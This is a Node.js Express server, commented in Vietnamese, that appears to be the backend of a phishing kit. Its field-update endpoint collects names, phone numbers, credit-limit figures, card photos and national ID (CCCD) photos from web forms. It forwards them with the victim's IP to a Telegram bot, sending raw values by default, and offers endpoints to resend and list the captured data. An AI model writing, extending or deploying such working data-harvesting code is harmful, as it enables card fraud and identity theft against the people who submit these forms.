// server.js — Telegram mini-API + field update
// Run: npm i express dotenv node-fetch
//      node server.js

const express = require('express');
const path = require('path');
require('dotenv').config();

// Polyfill fetch cho Node < 18
if (!global.fetch) {
    global.fetch = (...args) =>
        import('node-fetch').then(({ default: f }) => f(...args));
}

const app = express();
app.set('trust proxy', true); // nếu sau này chạy sau proxy (Nginx…), req.ip sẽ chính xác hơn
// Allow larger payloads (for base64 images sent as data URLs)
app.use(express.json({ limit: '10mb' }));

/**
 * Cấu hình từ .env (hoặc biến môi trường)
 * TELEGRAM_BOT_TOKEN=123456:ABC...
 * TELEGRAM_CHAT_ID=-100xxxxxxxxxx   (ID cá nhân, group hoặc channel)
 * ALLOW_RAW_SENSITIVE=true|false    (true: gửi nguyên văn dữ liệu field-update)
 * HOST=127.0.0.1
 * PORT=4000
 */
const config = {
    token: process.env.TELEGRAM_BOT_TOKEN || '',
    chatId: process.env.TELEGRAM_CHAT_ID || '',
    allowRawSensitive:
        (process.env.ALLOW_RAW_SENSITIVE || 'true').toLowerCase() === 'true',
    // If true, server will only receive and store updates but will NOT attempt to send to Telegram
    receiveOnly: (process.env.RECEIVE_ONLY || 'false').toLowerCase() === 'true',
};

// Sanitize token helper: trim and extract valid token pattern if user pasted extra text
function sanitizeToken(tok) {
    if (!tok && tok !== '') return '';
    const s = String(tok).trim();
    const m = s.match(/[0-9]+:[A-Za-z0-9_-]+/);
    return m ? m[0] : s;
}

// In-memory debug log of recent field updates (kept small)
const fieldUpdates = [];
function recordFieldUpdate(evt) {
    try {
        fieldUpdates.push(Object.assign({ receivedAt: new Date().toISOString() }, evt));
        if (fieldUpdates.length > 250) fieldUpdates.shift();
    } catch (e) { /* ignore */ }
}

// Ensure uploads directory exists for saving images
const fs = require('fs');
const uploadsDir = path.join(__dirname, 'public', 'uploads');
try {
    if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
} catch (e) { console.error('Could not ensure uploads dir', e); }

// Helper to save a base64 dataURL to disk, returns relative public path or null
function saveDataUrl(dataUrl, prefix = 'img') {
    if (!dataUrl || typeof dataUrl !== 'string') return null;
    const m = dataUrl.match(/^data:(image\/(png|jpeg|jpg));base64,(.+)$/i);
    if (!m) return null;
    const ext = m[2] === 'jpeg' ? 'jpg' : m[2];
    const b64 = m[3];
    try {
        const buf = Buffer.from(b64, 'base64');
        const name = `${prefix}-${Date.now()}-${Math.floor(Math.random() * 9000) + 1000}.${ext}`;
        const abs = path.join(uploadsDir, name);
        fs.writeFileSync(abs, buf);
        return `/public/uploads/${name}`; // served from /public
    } catch (e) {
        console.error('Failed to save image', e);
        return null;
    }
}

// Helper to send a photo to Telegram using multipart/form-data (fetch + FormData polyfill)
async function telegramSendPhoto(photoPathOrBuffer, caption) {
    if (!telegramEnabled()) return { skipped: true, reason: 'not_configured' };
    // If photoPathOrBuffer is a local file path (public folder) we need to stream it.
    // We'll use form-data package via dynamic import to avoid mandatory dependency when not needed.
    try {
        const FormData = (await import('form-data')).default;
        const form = new FormData();
        form.append('chat_id', config.chatId);
        if (caption) form.append('caption', caption);
        form.append('parse_mode', 'HTML');

        // Accept either a Buffer or a path string starting with '/public/'
        if (Buffer.isBuffer(photoPathOrBuffer)) {
            form.append('photo', photoPathOrBuffer, { filename: 'photo.jpg' });
        } else if (typeof photoPathOrBuffer === 'string') {
            // try to open file from disk
            const abs = path.join(__dirname, photoPathOrBuffer.replace(/^\//, ''));
            if (fs.existsSync(abs)) {
                form.append('photo', fs.createReadStream(abs));
            } else {
                return { ok: false, error: 'file_not_found' };
            }
        } else {
            return { ok: false, error: 'invalid_photo' };
        }

        const url = `https://api.telegram.org/bot${config.token}/sendPhoto`;
        const res = await fetch(url, { method: 'POST', body: form });
        let data = null;
        try { data = await res.json(); } catch (_) { data = null; }
        if (!res.ok || !data?.ok) {
            logTelegramError(res.status, data);
            return { ok: false, httpStatus: res.status, data };
        }
        return { ok: true, httpStatus: res.status, result: data.result };
    } catch (e) {
        console.error('telegramSendPhoto error', e);
        return { ok: false, error: e.message };
    }
}

function telegramEnabled() {
    // If receiveOnly mode is enabled, we intentionally disable outbound Telegram sends
    if (config.receiveOnly) return false;
    // Token chuẩn dạng digits:alphanumeric-_
    if (!config.token || !config.chatId) return false;
    if (!/^[0-9]+:[A-Za-z0-9_-]+$/.test(config.token)) return false;
    return true;
}

function maskToken(tok) {
    if (!tok) return null;
    if (tok.length <= 10) return tok.replace(/.(?=.{2})/g, '*');
    return tok.slice(0, 6) + '...' + tok.slice(-2);
}

let lastErrorStamp = 0;
let sameErrorCount = 0;
function logTelegramError(status, data) {
    const now = Date.now();
    if (now - lastErrorStamp < 1500) {
        sameErrorCount++;
        if (sameErrorCount % 10 === 0) {
            console.error(
                `Telegram HTTP error status= ${status} (repeated ${sameErrorCount} times)`
            );
        }
        return;
    }
    lastErrorStamp = now;
    sameErrorCount = 1;
    console.error('Telegram HTTP error status=', status, 'payload=',
        data && (data.description || JSON.stringify(data)).slice(0, 200));
}

async function telegramSend(text) {
    if (!telegramEnabled()) {
        console.warn('Telegram not configured');
        return { skipped: true, reason: 'not_configured' };
    }
    const url = `https://api.telegram.org/bot${config.token}/sendMessage`;
    const body = {
        chat_id: config.chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
    };

    try {
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        });
        let data = null;
        try { data = await res.json(); } catch (_) { data = null; }

        if (!res.ok || !data?.ok) {
            logTelegramError(res.status, data);
            return { ok: false, httpStatus: res.status, data };
        }
        return { ok: true, httpStatus: res.status, result: data.result };
    } catch (e) {
        console.error('Telegram send error', e);
        return { ok: false, error: e.message };
    }
}

/* ============================
 * Static files (public only)
 * ============================ */
// Serve project root so files like /js/app.js and /index.html are reachable when
// the app is run from repository root (development convenience).
app.use(express.static(path.join(__dirname), {
    index: ['index.html'],
    dotfiles: 'ignore',
    extensions: ['html'],
}));

// Also keep `public` for images and assets
app.use(
    express.static(path.join(__dirname, 'public'), {
        dotfiles: 'ignore',
        extensions: ['html'],
    })
);

/* ============================
 * Health & debug
 * ============================ */
app.get('/health', (req, res) => {
    res.json({ status: 'ok' }); // đồng bộ với script quét port
});

// Liệt kê route đã đăng ký (debug)
app.get('/__routes', (req, res) => {
    try {
        const out = [];
        app._router.stack.forEach((layer) => {
            if (layer.route && layer.route.path) {
                out.push({
                    path: layer.route.path,
                    methods: Object.keys(layer.route.methods)
                        .map((m) => m.toUpperCase())
                        .join(','),
                });
            }
        });
        res.json({ routes: out });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

setTimeout(() => {
    const listed = [];
    app._router.stack.forEach((layer) => {
        if (layer.route && layer.route.path) {
            listed.push(
                `${Object.keys(layer.route.methods)
                    .map((m) => m.toUpperCase())
                    .join(',')} ${layer.route.path}`
            );
        }
    });
    console.log('Registered routes:');
    listed.forEach((l) => console.log(' -', l));
}, 300);

/* ============================
 * Telegram Dev endpoints
 * ============================ */
app.get('/api/telegram/status', (req, res) => {
    res.json({
        status: 'ok',
        hasToken: !!config.token,
        hasChatId: !!config.chatId,
        allowRawSensitive: config.allowRawSensitive,
        maskedToken: maskToken(config.token),
        chatId: config.chatId || null,
        receiveOnly: config.receiveOnly,
        enabled: telegramEnabled(),
    });
});

app.post('/api/telegram/config', (req, res) => {
    const { token, chatId, allowRawSensitive, receiveOnly } = req.body || {};
    if (token !== undefined) config.token = sanitizeToken(String(token));
    if (chatId !== undefined) config.chatId = String(chatId).trim();
    if (allowRawSensitive !== undefined)
        config.allowRawSensitive = !!allowRawSensitive;
    if (receiveOnly !== undefined) config.receiveOnly = !!receiveOnly;
    res.json({
        status: 'ok',
        config: {
            hasToken: !!config.token,
            hasChatId: !!config.chatId,
            allowRawSensitive: config.allowRawSensitive,
            receiveOnly: config.receiveOnly,
            enabled: telegramEnabled(),
        },
    });
});

app.post('/api/telegram/test', async (req, res) => {
    const { text = 'Test message' } = req.body || {};
    if (!telegramEnabled())
        return res.status(400).json({ status: 'err', error: 'not_configured' });

    const r = await telegramSend(`[TEST]\n${text}`);
    let hint = null;
    if (!r.ok) {
        if (r.httpStatus === 404) {
            hint =
                '404 từ Telegram: Thường do token sai hoặc endpoint bị chặn. Kiểm tra lại token (dạng <digits>:<chuỗi>).';
        } else if (r.httpStatus === 400 && /chat not found/i.test(r?.data?.description || '')) {
            hint =
                'Chat not found: Sai chatId hoặc bot chưa được thêm vào nhóm/chat. Hãy nhắn bất kỳ cho bot hoặc add bot vào group/channel rồi thử lại.';
        }
    }
    res.status(r.ok ? 200 : 502).json({ status: r.ok ? 'ok' : 'err', detail: r, hint });
});

// Chẩn đoán sâu: getMe + probe sendMessage
app.get('/api/telegram/diagnose', async (req, res) => {
    if (!config.token) return res.status(400).json({ status: 'err', error: 'missing_token' });
    const result = { tokenFormatValid: /^[0-9]+:[A-Za-z0-9_-]+$/.test(config.token) };

    try {
        const r = await fetch(`https://api.telegram.org/bot${config.token}/getMe`);
        let jd = null;
        try { jd = await r.json(); } catch (_) { }
        result.getMe = { httpStatus: r.status, body: jd };
    } catch (e) {
        result.getMe = { error: e.message };
    }

    if (config.chatId) {
        try {
            const silent = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: config.chatId,
                    text: '[DIAG] test',
                    disable_notification: true,
                }),
            });
            let body = null;
            try { body = await silent.json(); } catch (_) { }
            result.sendProbe = { httpStatus: silent.status, body };
        } catch (e) {
            result.sendProbe = { error: e.message };
        }
    } else {
        result.sendProbe = { skipped: true, reason: 'no_chat_id' };
    }
    res.json(result);
});

/* ============================
 * Field Update endpoint
 * ============================ */
/**
 * POST /api/field-update
 * Body: { sessionId, field, value, page }
 * Trả:  { status: 'ok' }
 */
app.post('/api/field-update', async (req, res) => {
    // Accept either the old single-field shape { sessionId, field, value, page }
    // or a consolidated payload:
    // { sessionId, fullName, limitGranted, limitAvailable, phone, cardImage, cccdImage, page }
    const body = req.body || {};
    const sessionId = body.sessionId || body.session || null;
    if (!sessionId) return res.status(400).json({ status: 'err', error: 'missing_sessionId' });

    // If it's the legacy single-field update
    if (body.field && (body.value !== undefined && body.value !== null && String(body.value).trim() !== '')) {
        const { field, value, page } = body;
        const rawValue = String(value);
        const safeValue = config.allowRawSensitive ? rawValue : (rawValue.length > 3 ? rawValue[0] + '***' + rawValue.slice(-1) : '***');
        const lines = [
            '📩 <b>CẬP NHẬT TRƯỜNG</b>',
            `Phiên: <code>${sessionId}</code>`,
            page ? `Trang: <code>${page}</code>` : '',
            `Trường: <code>${field}</code>`,
            `Giá trị: <code>${safeValue}</code>`,
            `Thời gian: <code>${new Date().toISOString()}</code>`,
            `IP: <code>${req.ip}</code>`,
        ].filter(Boolean);
        telegramSend(lines.join('\n')).catch(() => { });
        recordFieldUpdate({ sessionId, field, value: rawValue, page, ip: req.ip });
        return res.json({ status: 'ok' });
    }

    // Consolidated payload handling
    const { fullName, limitGranted, limitAvailable, phone, cardImage, cccdImage, page } = body;
    // At minimum we expect at least one of the main fields
    if (!fullName && !limitGranted && !limitAvailable && !phone && !cardImage && !cccdImage) {
        return res.status(400).json({ status: 'err', error: 'missing_payload' });
    }

    // Build message lines
    const lines = ['📩 <b>PHIÊN GỬI THÔNG TIN</b>', `Phiên: <code>${sessionId}</code>`];
    if (page) lines.push(`Trang: <code>${page}</code>`);
    if (fullName) lines.push(`Họ và Tên: <b>${fullName}</b>`);
    if (limitGranted !== undefined && limitGranted !== null) lines.push(`Hạn Mức Được Cấp: <code>${limitGranted}</code>`);
    if (limitAvailable !== undefined && limitAvailable !== null) lines.push(`Hạn Mức Khả Dụng: <code>${limitAvailable}</code>`);
    if (phone) lines.push(`SDT: <code>${phone}</code>`);
    lines.push(`Thời gian: <code>${new Date().toISOString()}</code>`);
    lines.push(`IP: <code>${req.ip}</code>`);

    // Save images (if provided as data URLs). We store public paths so they can be inspected.
    const saved = {};
    if (cardImage) {
        const p = saveDataUrl(cardImage, 'card');
        if (p) saved.cardImage = p;
    }
    if (cccdImage) {
        const p2 = saveDataUrl(cccdImage, 'cccd');
        if (p2) saved.cccdImage = p2;
    }

    const textMessage = lines.join('\n');

    // Send text first
    telegramSend(textMessage).catch(() => { });

    // If images saved and telegram configured, send them as photos with caption linking to session
    try {
        if (saved.cardImage) {
            // caption include session and brief info
            const caption = `Thẻ — Phiên: <code>${sessionId}</code>\nHọ tên: ${fullName || '-'}\nSDT: ${phone || '-'} `;
            await telegramSendPhoto(saved.cardImage, caption).catch(() => { });
        }
        if (saved.cccdImage) {
            const caption = `CCCD — Phiên: <code>${sessionId}</code>\nHọ tên: ${fullName || '-'} `;
            await telegramSendPhoto(saved.cccdImage, caption).catch(() => { });
        }
    } catch (e) {
        // ignore individual photo errors
    }

    // Record the consolidated update (include saved file paths)
    recordFieldUpdate({ sessionId, fullName, limitGranted, limitAvailable, phone, page, ...saved, ip: req.ip });
    res.json({ status: 'ok', saved });
});

// Debug: read recent field updates
app.get('/api/field-updates', (req, res) => {
    res.json({ count: fieldUpdates.length, updates: fieldUpdates.slice(-100).reverse() });
});

// Re-send stored updates to Telegram (text + saved photos)
// POST /api/telegram/resend
// Body: { lastN?: number, sessionId?: string }
app.post('/api/telegram/resend', async (req, res) => {
    if (!telegramEnabled()) return res.status(400).json({ status: 'err', error: 'not_configured' });
    const { lastN = 10, sessionId } = req.body || {};
    let candidates = fieldUpdates.slice(-Math.max(0, Number(lastN) || 0));
    if (sessionId) candidates = fieldUpdates.filter((u) => u.sessionId === sessionId);

    const results = [];
    for (const u of candidates) {
        try {
            const lines = ['📩 <b>PHIÊN GỬI THÔNG TIN (RESEND)</b>', `Phiên: <code>${u.sessionId}</code>`];
            if (u.page) lines.push(`Trang: <code>${u.page}</code>`);
            if (u.fullName) lines.push(`Họ và Tên: <b>${u.fullName}</b>`);
            if (u.limitGranted) lines.push(`Hạn Mức Được Cấp: <code>${u.limitGranted}</code>`);
            if (u.limitAvailable) lines.push(`Hạn Mức Khả Dụng: <code>${u.limitAvailable}</code>`);
            if (u.phone) lines.push(`SDT: <code>${u.phone}</code>`);
            if (u.field && u.value) lines.push(`Trường: <code>${u.field}</code> — Giá trị: <code>${u.value}</code>`);
            lines.push(`Thời gian: <code>${u.receivedAt || new Date().toISOString()}</code>`);

            const textResult = await telegramSend(lines.join('\n'));
            const photoResults = [];
            if (u.cardImage) {
                const r = await telegramSendPhoto(u.cardImage, `Thẻ — Phiên: <code>${u.sessionId}</code>`).catch(() => null);
                photoResults.push({ type: 'cardImage', result: r });
            }
            if (u.cccdImage) {
                const r2 = await telegramSendPhoto(u.cccdImage, `CCCD — Phiên: <code>${u.sessionId}</code>`).catch(() => null);
                photoResults.push({ type: 'cccdImage', result: r2 });
            }
            results.push({ sessionId: u.sessionId, textResult, photoResults });
        } catch (e) {
            results.push({ sessionId: u.sessionId, error: e.message });
        }
    }
    res.json({ status: 'ok', count: candidates.length, results });
});

/* ============================
 * JSON parse error handler
 * ============================ */
app.use((err, req, res, next) => {
    if (err && err.type === 'entity.parse.failed') {
        return res.status(400).json({ status: 'err', error: 'invalid_json' });
    }
    next(err);
});

/* ============================
 * Start server with fallback ports
 * ============================ */
const HOST = process.env.HOST || '127.0.0.1';
const MAX_TRIES = 10;
let basePort = parseInt(process.env.PORT, 10) || 4000;

function startWithFallback(port, attempt = 0) {
    const server = app.listen(port, HOST, () => {
        console.log(`Server listening on http://${HOST}:${port}`);
    });
    server.on('error', (err) => {
        if (err.code === 'EADDRINUSE' && attempt < MAX_TRIES) {
            console.warn(`Port ${port} in use, trying ${port + 1}...`);
            startWithFallback(port + 1, attempt + 1);
        } else {
            console.error('Failed to start server:', err);
            process.exit(1);
        }
    });
}

startWithFallback(basePort);
